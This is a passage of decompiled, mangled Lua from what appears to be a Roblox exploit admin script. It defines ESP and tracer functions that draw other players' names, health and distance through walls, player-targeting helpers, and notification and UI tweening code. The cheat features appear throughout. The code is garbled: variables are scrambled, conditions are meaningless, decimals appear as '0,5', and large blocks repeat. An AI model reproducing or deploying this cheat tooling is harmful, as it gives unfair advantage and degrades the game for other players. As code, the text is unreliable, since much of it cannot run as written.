          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.SetAllTrans(UI.ChatLogs)
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.SetAllTrans((UI.ChatLogs:Clone()))
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
